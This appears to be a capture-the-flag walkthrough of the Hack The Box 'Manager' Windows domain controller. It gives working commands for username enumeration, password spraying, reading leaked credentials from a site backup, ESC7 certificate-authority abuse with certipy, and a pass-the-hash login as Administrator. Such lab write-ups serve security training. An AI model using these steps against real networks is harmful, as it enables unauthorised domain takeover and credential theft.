---
icon: windows
---

# Manager - Medium

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/manager"><strong>Manager</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.236 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 16:02 EST
Nmap scan report for 10.10.11.236
Host is up (0.055s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-28 04:08:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-28T04:10:28+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-11-28T04:10:29+00:00; +7h00m01s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-11-28T04:10:28+00:00; +7h00m01s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-28T03:55:35
|_Not valid after:  2055-11-28T03:55:35
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-11-28T04:10:28+00:00; +7h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-28T04:10:29+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
49781/tcp open  tcpwrapped
49795/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-28T04:09:51
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   82.74 ms 10.10.16.1
2   82.98 ms 10.10.11.236
```

The nmap scan shows the domain names of manager.htb and dc01.manager.htb. I'll add it to my /etc/hosts/ file

```
10.10.11.236	manager.htb dc01.manager.htb
```

### <mark style="color:$primary;">Kerbrute</mark>&#x20;

brute forcing usernames with [**kerbrute**](https://github.com/ropnop/kerbrute/releases)

{% code overflow="wrap" %}
```bash
kerbrute userenum ~/tools/SecLists/Usernames/xato-net-10-million-usernames.txt --dc dc01.manager.htb -d manager.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

It finds three usernames: administrator, guest, and operator.&#x20;

There are other wordlist you can use, here is another good one:

```bash
SecLists/Usernames/xato-net-10-million-usernames.txt 
```

I am going to check and see if any usernames I've found use their usernames as a password

```bash
netexec smb manager.htb -u users -p users --no-brute --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">MSSQL</mark>

```bash
netexec mssql manager.htb -u operator -p operator
```

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

Operator has access to mssql

{% code overflow="wrap" %}
```bash
impacket-mssqlclient manager.htb/operator:operator@manager.htb -windows-auth
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

We do not have acess to <mark style="color:$primary;">**xp\_cmdshell**</mark> but we do to <mark style="color:$primary;">**xp\_dirtree**</mark>

I am going to try and look for credentials on the system

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

There is a backup of the site in the root directory of the website! I'll download it

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
```

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

```shell
unzip website-backup-27-07-23-old.zip
```

<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

managed to find a config file with some credentials for raven.

```bash
netexec winrm manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

raven has winrm access!

```shellscript
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

<figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

This is an AD environment I'll go ahead and Check Advice Directory Certificate Services \[ADCS] first

{% code overflow="wrap" %}
```bash
certipy-ad find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**ESC7**</mark>: ESC7 is when a user has either the “Manage CA” or “Manage Certificates” access rights on the certificate authority itself. Raven has ManageCa rights (shown in the output above).

### <mark style="color:$primary;">Exploiting ESC7</mark>

First, I’ll need to use the Manage CA permission to give Raven the Manage Certificates permission:

{% code overflow="wrap" %}
```shellscript
certipy-ad ca -ca manager-DC01-CA -add-officer raven -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

Now Raven shows up there where they didn’t before:

<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

This gets reset periodically, so if I find some step breaks while exploiting, it’s worth going back to see if that is why.

{% code overflow="wrap" %}
```shellscript
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

#### Administrator Certificate

Next, we initiate the attack by requesting a certificate. Although the request fails, we successfully obtain a private key.

{% code overflow="wrap" %}
```bash
certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

This fails, but it saves the private key involved. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:

{% code overflow="wrap" %}
```bash
certipy-ad ca -ca manager-DC01-CA -target dc01.manager.htb -retrieve 21 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
{% endcode %}



Now, the issued certificate can be retrieved using the req command:

{% code overflow="wrap" %}
```bash
certipy-ad ca -ca manager-DC01-CA -target dc01.manager.htb -issue-request 21 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```shellscript
certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 21 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

If everything goes smoothly, we should receive an **Administrator.pfx** certificate.

### <mark style="color:$primary;">Administrator NTLM Hash</mark>

With this certificate as the administrator user, the easiest way to get a shell is to use it to get the NTLM hash for the user with the auth command. This requires the VM and target times to be in sync

```bash
service virtualbox-guest-utils stop
sudo ntpdate 10.10.11.236
```

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

The final step in this attack is extracting the NTLM hash from the **Administrator.pfx** certificate using the following command:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Pass the Hash Attack</mark>

we can use pass the hash to get a shell as administrator,

```bash
evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
```

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
